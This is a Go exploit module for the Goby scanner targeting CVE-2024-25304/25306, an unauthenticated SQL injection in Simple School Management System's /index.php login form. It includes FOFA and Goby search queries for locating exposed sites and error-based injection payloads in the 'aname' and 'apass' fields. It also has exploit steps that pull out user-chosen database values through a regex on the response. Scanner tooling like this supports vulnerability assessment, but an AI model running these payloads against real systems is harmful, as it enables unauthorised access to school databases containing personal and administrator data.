package exploits

import (
  "git.gobies.org/goby/goscanner/goutils"
)

func init() {
  expJson := `{
    "Name": "Simple School Managment System /index.php SQL Injection Vulnerability (CVE-2024-25306/CVE-2024-25304)",
    "Description": "<p>Code-projects Simple School Managment System is a PHP-based school management system used to manage the daily affairs of the school. The 'apass' parameter and 'aname' parameter in the '/index.php' page of the system have SQL injection vulnerabilities, which can be exploited by attackers to execute malicious SQL queries and operate the database to obtain sensitive information or further control the system.</p>",
    "Product": "Simple School Managment System",
    "Homepage": "https://code-projects.org/simple-school-management-in-php-with-source-code/",
    "DisclosureDate": "2024-02-09",
    "PostTime": "2024-12-26",
    "Author": "1251220046@qq.com",
    "FofaQuery": "body=\"School Management System\"&&body=\"Tutor Joe's\"",
    "GobyQuery": "body=\"School Management System\"&&body=\"Tutor Joe's\"",
    "Level": "1",
    "Impact": "<p>The 'apass' and 'aname' parameters in the '/index.php' page of Code-projects Simple School Managment System 1.0 version have SQL injection vulnerabilities. Unauthenticated attackers can use this vulnerability to obtain sensitive information in the database (such as administrator backend passwords, user personal information, etc.), and may even execute malicious commands with high permissions to further control the server.</p>",
    "Recommendation": "<p>1. Stay updated with vendor information and upgrade to the latest version: <a href=\"https://code-projects.org/simple-school-management-in-php-with-source-code/.\">https://code-projects.org/simple-school-management-in-php-with-source-code/.</a></p><p>2. Deploy a Web Application Firewall (WAF) to monitor database operations in real-time.</p><p>3. Restrict public access to the system or limit access permissions to reduce the attack surface.</p>",
    "References": [
        "https://github.com/tubakvgc/CVEs/tree/main/Simple%20School%20Management%20System"
    ],
    "Is0day": false,
    "HasExp": true,
    "ExpParams": [
        {
            "name": "attackType",
            "type": "select",
            "value": "default,custom,sqlpoint",
            "show": ""
        },
        {
            "name": "default",
            "type": "select",
            "value": "@@VERSION,user(),database()",
            "show": "attackType=default"
        },
        {
            "name": "custom",
            "type": "input",
            "value": "user()",
            "show": "attackType=custom"
        }
    ],
    "ExpTips": {
        "Type": "",
        "Content": ""
    },
    "ScanSteps": [
        "OR",
        {
            "Request": {
                "method": "POST",
                "uri": "/index.php",
                "follow_redirect": true,
                "header": {
                    "Content-Type": "application/x-www-form-urlencoded",
                    "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/110.0.5481.78 Safari/537.36",
                    "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7",
                    "Accept-Encoding": "gzip, deflate",
                    "Accept-Language": "en-US,en;q=0.9"
                },
                "data_type": "text",
                "data": "aname=1&apass=' OR (SELECT 1040 FROM(SELECT COUNT(*),CONCAT(0x7e,(SELECT {{{poc_payload}}}),0x7e,FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.PLUGINS GROUP BY x)a)-- sOoO&login="
            },
            "ResponseTest": {
                "type": "group",
                "operation": "AND",
                "checks": [
                    {
                        "type": "item",
                        "variable": "$code",
                        "operation": "==",
                        "value": "200",
                        "bz": ""
                    },
                    {
                        "type": "item",
                        "variable": "$body",
                        "operation": "contains",
                        "value": "{{{random_md5}}}",
                        "bz": ""
                    }
                ]
            },
            "SetVariable": []
        },
        {
            "Request": {
                "method": "POST",
                "uri": "/index.php",
                "follow_redirect": true,
                "header": {
                    "Content-Type": "application/x-www-form-urlencoded",
                    "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/110.0.5481.78 Safari/537.36",
                    "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7",
                    "Accept-Encoding": "gzip, deflate",
                    "Accept-Language": "en-US,en;q=0.9"
                },
                "data_type": "text",
                "data": "aname=' OR (SELECT 1040 FROM(SELECT COUNT(*),CONCAT(0x7e,(SELECT {{{poc_payload}}}),0x7e,FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.PLUGINS GROUP BY x)a)-- sOoO&apass=1&login="
            },
            "ResponseTest": {
                "type": "group",
                "operation": "AND",
                "checks": [
                    {
                        "type": "item",
                        "variable": "$code",
                        "operation": "==",
                        "value": "200",
                        "bz": ""
                    },
                    {
                        "type": "item",
                        "variable": "$body",
                        "operation": "contains",
                        "value": "{{{random_md5}}}",
                        "bz": ""
                    }
                ]
            },
            "SetVariable": []
        }
    ],
    "ExploitSteps": [
        "OR",
        {
            "Request": {
                "method": "POST",
                "uri": "/index.php",
                "follow_redirect": true,
                "header": {
                    "Content-Type": "application/x-www-form-urlencoded",
                    "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/110.0.5481.78 Safari/537.36",
                    "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7",
                    "Accept-Encoding": "gzip, deflate",
                    "Accept-Language": "en-US,en;q=0.9"
                },
                "data_type": "text",
                "data": "aname=1&apass=' OR (SELECT 1040 FROM(SELECT COUNT(*),CONCAT(0x7e,(SELECT {{{exp_payload}}}),0x7e,FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.PLUGINS GROUP BY x)a)-- sOoO&login="
            },
            "ResponseTest": {
                "type": "group",
                "operation": "AND",
                "checks": [
                    {
                        "type": "item",
                        "variable": "$code",
                        "operation": "==",
                        "value": "200",
                        "bz": ""
                    }
                ]
            },
            "SetVariable": [
                "output|lastbody|regex|~(.*?)~",
                "output|when|attackType=sqlpoint|{{{lastreq}}}aname=1&apass=' OR (SELECT 1040 FROM(SELECT COUNT(*),CONCAT(0x7e,(SELECT database()),0x7e,FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.PLUGINS GROUP BY x)a)-- sOoO&login="
            ]
        },
        {
            "Request": {
                "method": "POST",
                "uri": "/index.php",
                "follow_redirect": true,
                "header": {
                    "Content-Type": "application/x-www-form-urlencoded",
                    "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/110.0.5481.78 Safari/537.36",
                    "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7",
                    "Accept-Encoding": "gzip, deflate",
                    "Accept-Language": "en-US,en;q=0.9"
                },
                "data_type": "text",
                "data": "aname=' OR (SELECT 1040 FROM(SELECT COUNT(*),CONCAT(0x7e,(SELECT {{{exp_payload}}}),0x7e,FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.PLUGINS GROUP BY x)a)-- sOoO&apass=1&login="
            },
            "ResponseTest": {
                "type": "group",
                "operation": "AND",
                "checks": [
                    {
                        "type": "item",
                        "variable": "$code",
                        "operation": "==",
                        "value": "200",
                        "bz": ""
                    }
                ]
            },
            "SetVariable": [
                "output|lastbody|regex|~(.*?)~",
                "output|when|attackType=sqlpoint|{{{lastreq}}}aname=' OR (SELECT 1040 FROM(SELECT COUNT(*),CONCAT(0x7e,(SELECT database()),0x7e,FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.PLUGINS GROUP BY x)a)-- sOoO&apass=1&login="
            ]
        }
    ],
    "Tags": [
        "SQL Injection",
        "2H1W"
    ],
    "VulType": [
        "SQL Injection"
    ],
    "CVEIDs": [
        "CVE-2024-25304",
        "CVE-2024-25306"
    ],
    "CNNVD": [
        ""
    ],
    "CNVD": [
        ""
    ],
    "CVSSScore": "7.5",
    "Translation": {
        "CN": {
            "Name": "Simple School Managment System /index.php SQL 注入漏洞 （CVE-2024-25306/CVE-2024-25304）",
            "Product": "Simple School Managment System",
            "Description": "<p>Code-projects Simple School Managment System 是一个基于 PHP 的学校管理系统，用于管理学校的日常事务。该系统的 '/index.php' 页面中的 'apass' 参数和 'aname' 参数存在 SQL 注入漏洞，攻击者可以利用该漏洞执行恶意的 SQL 查询和操作数据库，从而获取敏感信息或进一步控制系统。</p>",
            "Recommendation": "<p>1. 建议及时关注厂商信息并更新到最新版本：<a href=\"https://code-projects.org/simple-school-management-in-php-with-source-code/\">https://code-projects.org/simple-school-management-in-php-with-source-code/</a>。</p><p>2. 部署 Web 应用防火墙（WAF），对数据库操作进行实时监控。</p><p>3. 禁止公网访问该系统，或限制访问权限以减少攻击面。</p>",
            "Impact": "<p>Code-projects Simple School Managment System 1.0版本的 '/index.php' 页面中的 'apass' 参数和'aname' 参数存在 SQL 注入漏洞，未经身份验证的攻击者可以通过该漏洞获取数据库中的敏感信息（如管理员后台密码、用户个人信息等），甚至可能在高权限下执行恶意命令，进一步控制服务器。</p>",
            "VulType": [
                "SQL注入"
            ],
            "Tags": [
                "SQL注入",
                "两高一弱"
            ]
        },
        "EN": {
            "Name": "Simple School Managment System /index.php SQL Injection Vulnerability (CVE-2024-25306/CVE-2024-25304)",
            "Product": "Simple School Managment System",
            "Description": "<p>Code-projects Simple School Managment System is a PHP-based school management system used to manage the daily affairs of the school. The 'apass' parameter and 'aname' parameter in the '/index.php' page of the system have SQL injection vulnerabilities, which can be exploited by attackers to execute malicious SQL queries and operate the database to obtain sensitive information or further control the system.<br></p>",
            "Recommendation": "<p>1. Stay updated with vendor information and upgrade to the latest version: <a href=\"https://code-projects.org/simple-school-management-in-php-with-source-code/.\">https://code-projects.org/simple-school-management-in-php-with-source-code/.</a></p><p>2. Deploy a Web Application Firewall (WAF) to monitor database operations in real-time.</p><p>3. Restrict public access to the system or limit access permissions to reduce the attack surface.</p>",
            "Impact": "<p>The 'apass' and 'aname' parameters in the '/index.php' page of Code-projects Simple School Managment System 1.0 version have SQL injection vulnerabilities. Unauthenticated attackers can use this vulnerability to obtain sensitive information in the database (such as administrator backend passwords, user personal information, etc.), and may even execute malicious commands with high permissions to further control the server.<br></p>",
            "VulType": [
                "SQL Injection"
            ],
            "Tags": [
                "SQL Injection",
                "2H1W"
            ]
        }
    },
    "AttackSurfaces": {
        "Application": null,
        "Support": null,
        "Service": null,
        "System": null,
        "Hardware": null
    },
    "Variables": {
        "random_int": "define|variable|{{{rand|int|8}}}",
        "random_md5": "define|md5|{{{random_int}}}",
        "poc_payload": "define|variable|md5({{{random_int}}})",
        "exp_payload": "switch|attackType|{{{default}}}"
    },
    "VariablesOrder": [
        "random_int",
        "random_md5",
        "poc_payload",
        "exp_payload"
    ],
    "EditType": "fast",
    "PocId": "9980"
}`
  
    ExpManager.AddExploit(NewExploit(
      goutils.GetFileName(),
      expJson,
      nil,
      nil,
    ))
  }